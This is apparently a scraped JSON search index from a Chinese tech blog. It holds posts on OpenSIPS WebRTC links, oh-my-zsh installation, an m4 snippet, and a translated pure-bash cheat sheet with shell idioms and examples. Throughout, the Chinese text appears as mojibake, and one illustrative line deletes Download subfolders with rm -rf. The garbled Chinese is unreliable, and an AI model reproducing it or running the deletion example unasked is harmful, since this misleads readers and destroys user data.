https://opensips.org/pub/events/2016-05-10_OpenSIPS-Summit_Amsterdam/Pete_Kelly-OpenSIPS_Summit2016-OpenSIPSandWebRTC.pdf pdfé™„ä»¶ Eric_Tamme-OpenSIPS_Summit_Austin_2015-WebRTC_with_OpenSIPS.pdf Pete_Kelly-OpenSIPS_Summit2016-OpenSIPSandWebRTC.pdf ","permalink":"https://wdd.js.org/opensips/ch9/webrtc-pdf/","summary":"å‚è€ƒ https://www.opensips.org/Documentation/Tutorials-WebSocket-2-2 https://opensips.org/pub/events/2016-05-10_OpenSIPS-Summit_Amsterdam/Pete_Kelly-OpenSIPS_Summit2016-OpenSIPSandWebRTC.pdf pdfé™„ä»¶ Eric_Tamme-OpenSIPS_Summit_Austin_2015-WebRTC_with_OpenSIPS.pdf Pete_Kelly-OpenSIPS_Summit2016-OpenSIPSandWebRTC.pdf ","title":"opensips ä¸ webrtcèµ„æ–™æ•´ç†"},{"content":"yum install zsh -y # githubä¸Šçš„é¡¹ç›®ä¸‹è½½å¤ªæ…¢ï¼Œæ‰€ä»¥æˆ‘å°±æŠŠé¡¹ç›®å…‹éš†åˆ°giteeä¸Šï¼Œè¿™æ ·å…‹éš†é€Ÿåº¦å°±éå¸¸å¿« git clone https://gitee.com/nuannuande/oh-my-zsh.git ~/.oh-my-zsh # è¿™ä¸€æ­¥æ˜¯å¯é€‰çš„ cp ~/.zshrc ~/.zshrc.orig # è¿™ä¸€æ­¥æ˜¯å¿…é¡»çš„ cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc # æ”¹å˜é»˜è®¤çš„sh, å¦‚æœè¿™ä¸€æ­¥æŠ¥é”™ï¼Œå°±å†æ¬¡è¾“å…¥ zsh chsh -s $(which zsh) ","permalink":"https://wdd.js.org/shell/manu-install-ohmyzsh/","summary":"yum install zsh -y # githubä¸Šçš„é¡¹ç›®ä¸‹è½½å¤ªæ…¢ï¼Œæ‰€ä»¥æˆ‘å°±æŠŠé¡¹ç›®å…‹éš†åˆ°giteeä¸Šï¼Œè¿™æ ·å…‹éš†é€Ÿåº¦å°±éå¸¸å¿« git clone https://gitee.com/nuannuande/oh-my-zsh.git ~/.oh-my-zsh # è¿™ä¸€æ­¥æ˜¯å¯é€‰çš„ cp ~/.zshrc ~/.zshrc.orig # è¿™ä¸€æ­¥æ˜¯å¿…é¡»çš„ cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc # æ”¹å˜é»˜è®¤çš„sh, å¦‚æœè¿™ä¸€æ­¥æŠ¥é”™ï¼Œå°±å†æ¬¡è¾“å…¥ zsh chsh -s $(which zsh) ","title":"æ‰‹å·¥å®‰è£…oh-my-zsh"},{"content":"define(`CF_INNER_IP\u0026#39;, `esyscmd(`printf \u0026#34;$PWD\u0026#34;\u0026#39;)\u0026#39;) ","permalink":"https://wdd.js.org/shell/m4-env/","summary":"define(`CF_INNER_IP\u0026#39;, `esyscmd(`printf \u0026#34;$PWD\u0026#34;\u0026#39;)\u0026#39;) ","title":"m4è¯»å–ç¯å¢ƒå˜é‡"},{"content":"å­—ç¬¦ä¸² å­—ç¬¦ä¸²åŒ…å« Using a test:\nif [[ $var == *sub_string* ]]; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;sub_string is in var.\u0026#34; fi # Inverse (substring not in string). if [[ $var != *sub_string* ]]; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;sub_string is not in var.\u0026#34; fi # This works for arrays too! if [[ ${arr[*]} == *sub_string* ]]; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;sub_string is in array.\u0026#34; fi Using a case statement:\ncase \u0026#34;$var\u0026#34; in *sub_string*) # Do stuff ;; *sub_string2*) # Do more stuff ;; *) # Else ;; esac å­—ç¬¦ä¸²å¼€å§‹ if [[ $var == sub_string* ]]; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;var starts with sub_string.\u0026#34; fi # Inverse (var does not start with sub_string). if [[ $var != sub_string* ]]; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;var does not start with sub_string.\u0026#34; fi å­—ç¬¦ä¸²ç»“å°¾ if [[ $var == *sub_string ]]; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;var ends with sub_string.\u0026#34; fi # Inverse (var does not end with sub_string). if [[ $var != *sub_string ]]; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;var does not end with sub_string.\u0026#34; fi å¾ªç¯ æ•°å­—èŒƒå›´å¾ªç¯ Alternative to seq.\n# Loop from 0-100 (no variable support). for i in {0..100}; do printf \u0026#39;%s\\n\u0026#39; \u0026#34;$i\u0026#34; done å˜é‡å¾ªç¯ Alternative to seq.\n# Loop from 0-VAR. VAR=50 for ((i=0;i\u0026lt;=VAR;i++)); do printf \u0026#39;%s\\n\u0026#39; \u0026#34;$i\u0026#34; done æ•°ç»„éå† arr=(apples oranges tomatoes) # Just elements. for element in \u0026#34;${arr[@]}\u0026#34;; do printf \u0026#39;%s\\n\u0026#39; \u0026#34;$element\u0026#34; done ç´¢å¼•éå† arr=(apples oranges tomatoes) # Elements and index. for i in \u0026#34;${!arr[@]}\u0026#34;; do printf \u0026#39;%s\\n\u0026#39; \u0026#34;${arr[i]}\u0026#34; done # Alternative method. for ((i=0;i\u0026lt;${#arr[@]};i++)); do printf \u0026#39;%s\\n\u0026#39; \u0026#34;${arr[i]}\u0026#34; done æ–‡ä»¶æˆ–è€…ç›®å½•éå† Donâ€™t use ls.\n# Greedy example. for file in *; do printf \u0026#39;%s\\n\u0026#39; \u0026#34;$file\u0026#34; done # PNG files in dir. for file in ~/Pictures/*.png; do printf \u0026#39;%s\\n\u0026#39; \u0026#34;$file\u0026#34; done # Iterate over directories. for dir in ~/Downloads/*/; do printf \u0026#39;%s\\n\u0026#39; \u0026#34;$dir\u0026#34; done # Brace Expansion. for file in /path/to/parentdir/{file1,file2,subdir/file3}; do printf \u0026#39;%s\\n\u0026#39; \u0026#34;$file\u0026#34; done # Iterate recursively. shopt -s globstar for file in ~/Pictures/**/*; do printf \u0026#39;%s\\n\u0026#39; \u0026#34;$file\u0026#34; done shopt -u globstar æ–‡ä»¶å¤„ç† CAVEAT: bash does not handle binary data properly in versions \u0026lt; 4.4.\nå°†æ–‡ä»¶è¯»å–ä¸ºå­—ç¬¦ä¸² Alternative to the cat command.\nfile_data=\u0026#34;$(\u0026lt;\u0026#34;file\u0026#34;)\u0026#34; å°†æ–‡ä»¶æŒ‰è¡Œè¯»å–æˆæ•°ç»„ Alternative to the cat command.\n# Bash \u0026lt;4 (discarding empty lines). IFS=$\u0026#39;\\n\u0026#39; read -d \u0026#34;\u0026#34; -ra file_data \u0026lt; \u0026#34;file\u0026#34; # Bash \u0026lt;4 (preserving empty lines). while read -r line; do file_data+=(\u0026#34;$line\u0026#34;) done \u0026lt; \u0026#34;file\u0026#34; # Bash 4+ mapfile -t file_data \u0026lt; \u0026#34;file\u0026#34; è·å–æ–‡ä»¶å¤´éƒ¨çš„ N è¡Œ Alternative to the head command.\nCAVEAT: Requires bash 4+\nExample Function:\nhead() { # Usage: head \u0026#34;n\u0026#34; \u0026#34;file\u0026#34; mapfile -tn \u0026#34;$1\u0026#34; line \u0026lt; \u0026#34;$2\u0026#34; printf \u0026#39;%s\\n\u0026#39; \u0026#34;${line[@]}\u0026#34; } Example Usage:\n$ head 2 ~/.bashrc # Prompt PS1=\u0026#39;âœ \u0026#39; $ head 1 ~/.bashrc # Prompt è·å–å°¾éƒ¨ N è¡Œ Alternative to the tail command.\nCAVEAT: Requires bash 4+\nExample Function:\ntail() { # Usage: tail \u0026#34;n\u0026#34; \u0026#34;file\u0026#34; mapfile -tn 0 line \u0026lt; \u0026#34;$2\u0026#34; printf \u0026#39;%s\\n\u0026#39; \u0026#34;${line[@]: -$1}\u0026#34; } Example Usage:\n$ tail 2 ~/.bashrc # Enable tmux. # [[ -z \u0026#34;$TMUX\u0026#34; ]] \u0026amp;\u0026amp; exec tmux $ tail 1 ~/.bashrc # [[ -z \u0026#34;$TMUX\u0026#34; ]] \u0026amp;\u0026amp; exec tmux è·å–æ–‡ä»¶è¡Œæ•° Alternative to wc -l.\nExample Function (bash 4):\nlines() { # Usage: lines \u0026#34;file\u0026#34; mapfile -tn 0 lines \u0026lt; \u0026#34;$1\u0026#34; printf \u0026#39;%s\\n\u0026#39; \u0026#34;${#lines[@]}\u0026#34; } Example Function (bash 3):\nThis method uses less memory than the mapfile method and works in bash 3 but it is slower for bigger files.\nlines_loop() { # Usage: lines_loop \u0026#34;file\u0026#34; count=0 while IFS= read -r _; do ((count++)) done \u0026lt; \u0026#34;$1\u0026#34; printf \u0026#39;%s\\n\u0026#39; \u0026#34;$count\u0026#34; } Example Usage:\n$ lines ~/.bashrc 48 $ lines_loop ~/.bashrc 48 è®¡ç®—æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹æ•°é‡ This works by passing the output of the glob to the function and then counting the number of arguments.\nExample Function:\ncount() { # Usage: count /path/to/dir/* # count /path/to/dir/*/ printf \u0026#39;%s\\n\u0026#39; \u0026#34;$#\u0026#34; } Example Usage:\n# Count all files in dir. $ count ~/Downloads/* 232 # Count all dirs in dir. $ count ~/Downloads/*/ 45 # Count all jpg files in dir. $ count ~/Pictures/*.jpg 64 åˆ›å»ºä¸´æ—¶æ–‡ä»¶ Alternative to touch.\n# Shortest. \u0026gt;file # Longer alternatives: :\u0026gt;file echo -n \u0026gt;file printf \u0026#39;\u0026#39; \u0026gt;file åœ¨ä¸¤ä¸ªæ ‡è®°ä¹‹é—´æŠ½å– N è¡Œ Example Function:\nextract() { # Usage: extract file \u0026#34;opening marker\u0026#34; \u0026#34;closing marker\u0026#34; while IFS=$\u0026#39;\\n\u0026#39; read -r line; do [[ $extract \u0026amp;\u0026amp; $line != \u0026#34;$3\u0026#34; ]] \u0026amp;\u0026amp; printf \u0026#39;%s\\n\u0026#39; \u0026#34;$line\u0026#34; [[ $line == \u0026#34;$2\u0026#34; ]] \u0026amp;\u0026amp; extract=1 [[ $line == \u0026#34;$3\u0026#34; ]] \u0026amp;\u0026amp; extract= done \u0026lt; \u0026#34;$1\u0026#34; } Example Usage:\n# Extract code blocks from MarkDown file. $ extract ~/projects/pure-bash/README.md \u0026#39;```sh\u0026#39; \u0026#39;```\u0026#39; # Output here... æ–‡ä»¶è·¯å¾„ è·å–æ–‡ä»¶çš„ç›®å½• Alternative to the dirname command.\nExample Function:\ndirname() { # Usage: dirname \u0026#34;path\u0026#34; local tmp=${1:-.} [[ $tmp != *[!/]* ]] \u0026amp;\u0026amp; { printf \u0026#39;/\\n\u0026#39; return } tmp=${tmp%%\u0026#34;${tmp##*[!/]}\u0026#34;} [[ $tmp != */* ]] \u0026amp;\u0026amp; { printf \u0026#39;.\\n\u0026#39; return } tmp=${tmp%/*} tmp=${tmp%%\u0026#34;${tmp##*[!/]}\u0026#34;} printf \u0026#39;%s\\n\u0026#39; \u0026#34;${tmp:-/}\u0026#34; } Example Usage:\n$ dirname ~/Pictures/Wallpapers/1.jpg /home/black/Pictures/Wallpapers $ dirname ~/Pictures/Downloads/ /home/black/Pictures è·å–æ–‡ä»¶è·¯å¾„çš„ base-name Alternative to the basename command.\nExample Function:\nbasename() { # Usage: basename \u0026#34;path\u0026#34; [\u0026#34;suffix\u0026#34;] local tmp tmp=${1%\u0026#34;${1##*[!/]}\u0026#34;} tmp=${tmp##*/} tmp=${tmp%\u0026#34;${2/\u0026#34;$tmp\u0026#34;}\u0026#34;} printf \u0026#39;%s\\n\u0026#39; \u0026#34;${tmp:-/}\u0026#34; } Example Usage:\n$ basename ~/Pictures/Wallpapers/1.jpg 1.jpg $ basename ~/Pictures/Wallpapers/1.jpg .jpg 1 $ basename ~/Pictures/Downloads/ Downloads å˜é‡ å˜é‡å£°æ˜å’Œä½¿ç”¨ $ hello_world=\u0026#34;value\u0026#34; # Create the variable name. $ var=\u0026#34;world\u0026#34; $ ref=\u0026#34;hello_$var\u0026#34; # Print the value of the variable name stored in \u0026#39;hello_$var\u0026#39;. $ printf \u0026#39;%s\\n\u0026#39; \u0026#34;${!ref}\u0026#34; value Alternatively, on bash 4.3+:\n$ hello_world=\u0026#34;value\u0026#34; $ var=\u0026#34;world\u0026#34; # Declare a nameref. $ declare -n ref=hello_$var $ printf \u0026#39;%s\\n\u0026#39; \u0026#34;$ref\u0026#34; value åŸºäºå˜é‡å‘½åå˜é‡ $ var=\u0026#34;world\u0026#34; $ declare \u0026#34;hello_$var=value\u0026#34; $ printf \u0026#39;%s\\n\u0026#39; \u0026#34;$hello_world\u0026#34; value ESCAPE SEQUENCES Contrary to popular belief, there is no issue in utilizing raw escape sequences. Using tput abstracts the same ANSI sequences as if printed manually. Worse still, tput is not actually portable. There are a number of tput variants each with different commands and syntaxes (try tput setaf 3 on a FreeBSD system). Raw sequences are fine.\næ–‡æœ¬é¢œè‰² NOTE: Sequences requiring RGB values only work in True-Color Terminal Emulators.\nSequence What does it do? Value \\e[38;5;\u0026lt;NUM\u0026gt;m Set text foreground color. 0-255 \\e[48;5;\u0026lt;NUM\u0026gt;m Set text background color. 0-255 \\e[38;2;\u0026lt;R\u0026gt;;\u0026lt;G\u0026gt;;\u0026lt;B\u0026gt;m Set text foreground color to RGB color. R, G, B \\e[48;2;\u0026lt;R\u0026gt;;\u0026lt;G\u0026gt;;\u0026lt;B\u0026gt;m Set text background color to RGB color. R, G, B æ–‡æœ¬å±æ€§ NOTE: Prepend 2 to any code below to turn it\u0026rsquo;s effect off(examples: 21=bold text off, 22=faint text off, 23=italic text off).\nSequence What does it do? \\e[m Reset text formatting and colors. \\e[1m Bold text. \\e[2m Faint text. \\e[3m Italic text. \\e[4m Underline text. \\e[5m Blinking text. \\e[7m Highlighted text. \\e[8m Hidden text. \\e[9m Strike-through text. å…‰æ ‡ç§»åŠ¨ Sequence What does it do? Value \\e[\u0026lt;LINE\u0026gt;;\u0026lt;COLUMN\u0026gt;H Move cursor to absolute position. line, column \\e[H Move cursor to home position (0,0). \\e[\u0026lt;NUM\u0026gt;A Move cursor up N lines. num \\e[\u0026lt;NUM\u0026gt;B Move cursor down N lines. num \\e[\u0026lt;NUM\u0026gt;C Move cursor right N columns. num \\e[\u0026lt;NUM\u0026gt;D Move cursor left N columns. num \\e[s Save cursor position. \\e[u Restore cursor position. æ–‡æœ¬æ“¦é™¤ Sequence What does it do? \\e[K Erase from cursor position to end of line. \\e[1K Erase from cursor position to start of line. \\e[2K Erase the entire current line. \\e[J Erase from the current line to the bottom of the screen. \\e[1J Erase from the current line to the top of the screen. \\e[2J Clear the screen. \\e[2J\\e[H Clear the screen and move cursor to 0,0. å‚æ•°å±•å¼€ æŒ‡ä»¤ Parameter What does it do? ${!VAR} Access a variable based on the value of VAR. ${!VAR*} Expand to IFS separated list of variable names starting with VAR. ${!VAR@} Expand to IFS separated list of variable names starting with VAR. If double-quoted, each variable name expands to a separate word. æ›¿æ¢ Parameter What does it do? ${VAR#PATTERN} Remove shortest match of pattern from start of string. ${VAR##PATTERN} Remove longest match of pattern from start of string. ${VAR%PATTERN} Remove shortest match of pattern from end of string. ${VAR%%PATTERN} Remove longest match of pattern from end of string. ${VAR/PATTERN/REPLACE} Replace first match with string. ${VAR//PATTERN/REPLACE} Replace all matches with string. ${VAR/PATTERN} Remove first match. ${VAR//PATTERN} Remove all matches. é•¿åº¦ Parameter What does it do? ${#VAR} Length of var in characters. ${#ARR[@]} Length of array in elements. å±•å¼€ Parameter What does it do? ${VAR:OFFSET} Remove first N chars from variable. ${VAR:OFFSET:LENGTH} Get substring from N character to N character. (${VAR:10:10}: Get sub-string from char 10 to char 20) ${VAR:: OFFSET} Get first N chars from variable. ${VAR:: -OFFSET} Remove last N chars from variable. ${VAR: -OFFSET} Get last N chars from variable. ${VAR:OFFSET:-OFFSET} Cut first N chars and last N chars. å¤§å°å†™ä¿®æ”¹ Parameter What does it do? CAVEAT ${VAR^} Uppercase first character. bash 4+ ${VAR^^} Uppercase all characters. bash 4+ ${VAR,} Lowercase first character. bash 4+ ${VAR,,} Lowercase all characters. bash 4+ ${VAR~} Reverse case of first character. bash 4+ ${VAR~~} Reverse case of all characters. bash 4+ é»˜è®¤å€¼ Parameter What does it do? ${VAR:-STRING} If VAR is empty or unset, use STRING as its value. ${VAR-STRING} If VAR is unset, use STRING as its value. ${VAR:=STRING} If VAR is empty or unset, set the value of VAR to STRING. ${VAR=STRING} If VAR is unset, set the value of VAR to STRING. ${VAR:+STRING} If VAR is not empty, use STRING as its value. ${VAR+STRING} If VAR is set, use STRING as its value. ${VAR:?STRING} Display an error if empty or unset. ${VAR?STRING} Display an error if unset. å¤§æ‹¬å·å±•å¼€ èŒƒå›´ # Syntax: {\u0026lt;START\u0026gt;..\u0026lt;END\u0026gt;} # Print numbers 1-100. echo {1..100} # Print range of floats. echo 1.{1..9} # Print chars a-z. echo {a..z} echo {A..Z} # Nesting. echo {A..Z}{0..9} # Print zero-padded numbers. # CAVEAT: bash 4+ echo {01..100} # Change increment amount. # Syntax: {\u0026lt;START\u0026gt;..\u0026lt;END\u0026gt;..\u0026lt;INCREMENT\u0026gt;} # CAVEAT: bash 4+ echo {1..10..2} # Increment by 2. å­—ç¬¦ä¸²åˆ—è¡¨ echo {apples,oranges,pears,grapes} # Example Usage: # Remove dirs Movies, Music and ISOS from ~/Downloads/. rm -rf ~/Downloads/{Movies,Music,ISOS} æ¡ä»¶è¡¨è¾¾å¼ æ–‡ä»¶æ¡ä»¶åˆ¤æ–­ Expression Value What does it do? -a file If file exists. -b file If file exists and is a block special file. -c file If file exists and is a character special file. -d file If file exists and is a directory. -e file If file exists. -f file If file exists and is a regular file. -g file If file exists and its set-group-id bit is set. -h file If file exists and is a symbolic link. -k file If file exists and its sticky-bit is set -p file If file exists and is a named pipe (FIFO). -r file If file exists and is readable. -s file If file exists and its size is greater than zero. -t fd If file descriptor is open and refers to a terminal. -u file If file exists and its set-user-id bit is set. -w file If file exists and is writable. -x file If file exists and is executable. -G file If file exists and is owned by the effective group ID. -L file If file exists and is a symbolic link. -N file If file exists and has been modified since last read. -O file If file exists and is owned by the effective user ID. -S file If file exists and is a socket. æ–‡ä»¶æ¯”è¾ƒ Expression What does it do? file -ef file2 If both files refer to the same inode and device numbers. file -nt file2 If file is newer than file2 (uses modification time) or file exists and file2 does not. file -ot file2 If file is older than file2 (uses modification time) or file2 exists and file does not. å˜é‡æµ‹è¯• Expression Value What does it do? -o opt If shell option is enabled. -v var If variable has a value assigned. -R var If variable is a name reference. -z var If the length of string is zero. -n var If the length of string is non-zero. å˜é‡æ¯”è¾ƒ Expression What does it do? var = var2 Equal to. var == var2 Equal to (synonym for =). var != var2 Not equal to. var \u0026lt; var2 Less than (in ASCII alphabetical order.) var \u0026gt; var2 Greater than (in ASCII alphabetical order.) ç®—æ•°æ“ä½œ èµ‹å€¼ Operators What does it do? = Initialize or change the value of a variable. ç®—æ•° Operators What does it do? + Addition - Subtraction * Multiplication / Division ** Exponentiation % Modulo += Plus-Equal (Increment a variable.) -= Minus-Equal (Decrement a variable.) *= Times-Equal (Multiply a variable.) /= Slash-Equal (Divide a variable.) %= Mod-Equal (Remainder of dividing a variable.) ä½æ“ä½œ Operators What does it do? \u0026lt;\u0026lt; Bitwise Left Shift \u0026lt;\u0026lt;= Left-Shift-Equal \u0026gt;\u0026gt; Bitwise Right Shift \u0026gt;\u0026gt;= Right-Shift-Equal \u0026amp; Bitwise AND \u0026amp;= Bitwise AND-Equal | Bitwise OR |= Bitwise OR-Equal ~ Bitwise NOT ^ Bitwise XOR ^= Bitwise XOR-Equal é€»è¾‘ Operators What does it do? ! NOT \u0026amp;\u0026amp; AND || OR Miscellaneous Operators What does it do? Example , Comma Separator ((a=1,b=2,c=3)) ARITHMETIC Simpler syntax to set variables # Simple math ((var=1+2)) # Decrement/Increment variable ((var++)) ((var--)) ((var+=1)) ((var-=1)) # Using variables ((var=var2*arr[2])) Ternary Tests # Set the value of var to var2 if var2 is greater than var. # var: variable to set. # var2\u0026gt;var: Condition to test. # ?var2: If the test succeeds. # :var: If the test fails. ((var=var2\u0026gt;var?var2:var)) TRAPS Traps allow a script to execute code on various signals. In pxltrm (a pixel art editor written in bash) traps are used to redraw the user interface on window resize. Another use case is cleaning up temporary files on script exit.\nTraps should be added near the start of scripts so any early errors are also caught.\nNOTE: For a full list of signals, see trap -l.\nDo something on script exit # Clear screen on script exit. trap \u0026#39;printf \\\\e[2J\\\\e[H\\\\e[m\u0026#39; EXIT Ignore terminal interrupt (CTRL+C, SIGINT) trap \u0026#39;\u0026#39; INT React to window resize # Call a function on window resize. trap \u0026#39;code_here\u0026#39; SIGWINCH Do something before every command trap \u0026#39;code_here\u0026#39; DEBUG Do something when a shell function or a sourced file finishes executing trap \u0026#39;code_here\u0026#39; RETURN PERFORMANCE Disable Unicode If unicode is not required, it can be disabled for a performance increase. Results may vary however there have been noticeable improvements in neofetch and other programs.\n# Disable unicode. LC_ALL=C LANG=C OBSOLETE SYNTAX Shebang Use #!/usr/bin/env bash instead of #!/bin/bash.\nThe former searches the user\u0026rsquo;s PATH to find the bash binary. The latter assumes it is always installed to /bin/ which can cause issues. NOTE: There are times when one may have a good reason for using #!/bin/bash or another direct path to the binary.\n# Right: #!/usr/bin/env bash # Less right: #!/bin/bash Command Substitution Use $() instead of .\n# Right. var=\u0026#34;$(command)\u0026#34; # Wrong. var=`command` # $() can easily be nested whereas `` cannot. var=\u0026#34;$(command \u0026#34;$(command)\u0026#34;)\u0026#34; Function Declaration Do not use the function keyword, it reduces compatibility with older versions of bash.\n# Right. do_something() { # ... } # Wrong. function do_something() { # ... } INTERNAL VARIABLES Get the location to the bash binary \u0026#34;$BASH\u0026#34; Get the version of the current running bash process # As a string. \u0026#34;$BASH_VERSION\u0026#34; # As an array. \u0026#34;${BASH_VERSINFO[@]}\u0026#34; Open the user\u0026rsquo;s preferred text editor \u0026#34;$EDITOR\u0026#34; \u0026#34;$file\u0026#34; # NOTE: This variable may be empty, set a fallback value. \u0026#34;${EDITOR:-vi}\u0026#34; \u0026#34;$file\u0026#34; Get the name of the current function # Current function. \u0026#34;${FUNCNAME[0]}\u0026#34; # Parent function. \u0026#34;${FUNCNAME[1]}\u0026#34; # So on and so forth. \u0026#34;${FUNCNAME[2]}\u0026#34; \u0026#34;${FUNCNAME[3]}\u0026#34; # All functions including parents. \u0026#34;${FUNCNAME[@]}\u0026#34; Get the host-name of the system \u0026#34;$HOSTNAME\u0026#34; # NOTE: This variable may be empty. # Optionally set a fallback to the hostname command. \u0026#34;${HOSTNAME:-$(hostname)}\u0026#34; Get the architecture of the Operating System \u0026#34;$HOSTTYPE\u0026#34; Get the name of the Operating System / Kernel This can be used to add conditional support for different OperatingSystems without needing to call uname.\n\u0026#34;$OSTYPE\u0026#34; Get the current working directory This is an alternative to the pwd built-in.\n\u0026#34;$PWD\u0026#34; Get the number of seconds the script has been running \u0026#34;$SECONDS\u0026#34; Get a pseudorandom integer Each time $RANDOM is used, a different integer between 0 and 32767 is returned. This variable should not be used for anything related to security (this includes encryption keys etc).\n\u0026#34;$RANDOM\u0026#34; INFORMATION ABOUT THE TERMINAL Get the terminal size in lines and columns (from a script) This is handy when writing scripts in pure bash and stty/tput canâ€™t becalled.\nExample Function:\nget_term_size() { # Usage: get_term_size # (:;:) is a micro sleep to ensure the variables are # exported immediately. shopt -s checkwinsize; (:;:) printf \u0026#39;%s\\n\u0026#39; \u0026#34;$LINES $COLUMNS\u0026#34; } Example Usage:\n# Output: LINES COLUMNS $ get_term_size 15 55 Get the terminal size in pixels CAVEAT: This does not work in some terminal emulators.\nExample Function:\nget_window_size() { # Usage: get_window_size printf \u0026#39;%b\u0026#39; \u0026#34;${TMUX:+\\\\ePtmux;\\\\e}\\\\e[14t${TMUX:+\\\\e\\\\\\\\}\u0026#34; IFS=\u0026#39;;t\u0026#39; read -d t -t 0.05 -sra term_size printf \u0026#39;%s\\n\u0026#39; \u0026#34;${term_size[1]}x${term_size[2]}\u0026#34; } Example Usage:\n# Output: WIDTHxHEIGHT $ get_window_size 1200x800 # Output (fail): $ get_window_size x Get the current cursor position This is useful when creating a TUI in pure bash.\nExample Function:\nget_cursor_pos() { # Usage: get_cursor_pos IFS=\u0026#39;[;\u0026#39; read -p $\u0026#39;\\e[6n\u0026#39; -d R -rs _ y x _ printf \u0026#39;%s\\n\u0026#39; \u0026#34;$x $y\u0026#34; } Example Usage:\n# Output: X Y $ get_cursor_pos 1 8 CONVERSION Convert a hex color to RGB Example Function:\nhex_to_rgb() { # Usage: hex_to_rgb \u0026#34;#FFFFFF\u0026#34; # hex_to_rgb \u0026#34;000000\u0026#34; : \u0026#34;${1/\\#}\u0026#34; ((r=16#${_:0:2},g=16#${_:2:2},b=16#${_:4:2})) printf \u0026#39;%s\\n\u0026#39; \u0026#34;$r $g $b\u0026#34; } Example Usage:\n$ hex_to_rgb \u0026#34;#FFFFFF\u0026#34; 255 255 255 Convert an RGB color to hex Example Function:\nrgb_to_hex() { # Usage: rgb_to_hex \u0026#34;r\u0026#34; \u0026#34;g\u0026#34; \u0026#34;b\u0026#34; printf \u0026#39;#%02x%02x%02x\\n\u0026#39; \u0026#34;$1\u0026#34; \u0026#34;$2\u0026#34; \u0026#34;$3\u0026#34; } Example Usage:\n$ rgb_to_hex \u0026#34;255\u0026#34; \u0026#34;255\u0026#34; \u0026#34;255\u0026#34; #FFFFFF CODE GOLF Shorter for loop syntax # Tiny C Style. for((;i++\u0026lt;10;)){ echo \u0026#34;$i\u0026#34;;} # Undocumented method. for i in {1..10};{ echo \u0026#34;$i\u0026#34;;} # Expansion. for i in {1..10}; do echo \u0026#34;$i\u0026#34;; done # C Style. for((i=0;i\u0026lt;=10;i++)); do echo \u0026#34;$i\u0026#34;; done Shorter infinite loops # Normal method while :; do echo hi; done # Shorter for((;;)){ echo hi;} Shorter function declaration # Normal method f(){ echo hi;} # Using a subshell f()(echo hi) # Using arithmetic # This can be used to assign integer values. # Example: f a=1 # f a++ f()(($1)) # Using tests, loops etc. # NOTE: â€˜whileâ€™, â€˜untilâ€™, â€˜caseâ€™, â€˜(())â€™, â€˜[[]]â€™ can also be used. f()if true; then echo \u0026#34;$1\u0026#34;; fi f()for i in \u0026#34;$@\u0026#34;; do echo \u0026#34;$i\u0026#34;; done Shorter if syntax # One line # Note: The 3rd statement may run when the 1st is true [[ $var == hello ]] \u0026amp;\u0026amp; echo hi || echo bye [[ $var == hello ]] \u0026amp;\u0026amp; { echo hi; echo there; } || echo bye # Multi line (no else, single statement) # Note: The exit status may not be the same as with an if statement [[ $var == hello ]] \u0026amp;\u0026amp; echo hi # Multi line (no else) [[ $var == hello ]] \u0026amp;\u0026amp; { echo hi # ... } Simpler case statement to set variable The : built-in can be used to avoid repeating variable= in a case statement. The $_ variable stores the last argument of the last command. : always succeeds so it can be used to store the variable value.\n# Modified snippet from Neofetch. case \u0026#34;$OSTYPE\u0026#34; in \u0026#34;darwin\u0026#34;*) : \u0026#34;MacOS\u0026#34; ;; \u0026#34;linux\u0026#34;*) : \u0026#34;Linux\u0026#34; ;; *\u0026#34;bsd\u0026#34;* | \u0026#34;dragonfly\u0026#34; | \u0026#34;bitrig\u0026#34;) : \u0026#34;BSD\u0026#34; ;; \u0026#34;cygwin\u0026#34; | \u0026#34;msys\u0026#34; | \u0026#34;win32\u0026#34;) : \u0026#34;Windows\u0026#34; ;; *) printf \u0026#39;%s\\n\u0026#39; \u0026#34;Unknown OS detected, aborting...\u0026#34; \u0026gt;\u0026amp;2 exit 1 ;; esac # Finally, set the variable. os=\u0026#34;$_\u0026#34; OTHER Use read as an alternative to the sleep command Surprisingly, sleep is an external command and not a bash built-in.\nCAVEAT: Requires bash 4+\nExample Function:\nread_sleep() { # Usage: read_sleep 1 # read_sleep 0.2 read -rt \u0026#34;$1\u0026#34; \u0026lt;\u0026gt; \u0026lt;(:) || : } Example Usage:\nread_sleep 1 read_sleep 0.1 read_sleep 30 For performance-critical situations, where it is not economic to open and close an excessive number of file descriptors, the allocation of a file descriptor may be done only once for all invocations of read:\n(See the generic original implementation at https://blog.dhampir.no/content/sleeping-without-a-subprocess-in-bash-and-how-to-sleep-forever)\nexec {sleep_fd}\u0026lt;\u0026gt; \u0026lt;(:) while some_quick_test; do # equivalent of sleep 0.001 read -t 0.001 -u $sleep_fd done Check if a program is in the user\u0026rsquo;s PATH # There are 3 ways to do this and either one can be used. type -p executable_name \u0026amp;\u0026gt;/dev/null hash executable_name \u0026amp;\u0026gt;/dev/null command -v executable_name \u0026amp;\u0026gt;/dev/null # As a test. if type -p executable_name \u0026amp;\u0026gt;/dev/null; then # Program is in PATH. fi # Inverse. if ! type -p executable_name \u0026amp;\u0026gt;/dev/null; then # Program is not in PATH. fi # Example (Exit early if program is not installed). if ! type -p convert \u0026amp;\u0026gt;/dev/null; then printf \u0026#39;%s\\n\u0026#39; \u0026#34;error: convert is not installed, exiting...\u0026#34; exit 1 fi Get the current date using strftime Bashâ€™s printf has a built-in method of getting the date which can be used in place of the date command.\nCAVEAT: Requires bash 4+\nExample Function:\ndate() { # Usage: date \u0026#34;format\u0026#34; # See: \u0026#39;man strftime\u0026#39; for format. printf \u0026#34;%($1)T\\\\n\u0026#34; \u0026#34;-1\u0026#34; } Example Usage:\n# Using above function. $ date \u0026#34;%a %d %b - %l:%M %p\u0026#34; Fri 15 Jun - 10:00 AM # Using printf directly. $ printf \u0026#39;%(%a %d %b - %l:%M %p)T\\n\u0026#39; \u0026#34;-1\u0026#34; Fri 15 Jun - 10:00 AM # Assigning a variable using printf. $ printf -v date \u0026#39;%(%a %d %b - %l:%M %p)T\\n\u0026#39; \u0026#39;-1\u0026#39; $ printf 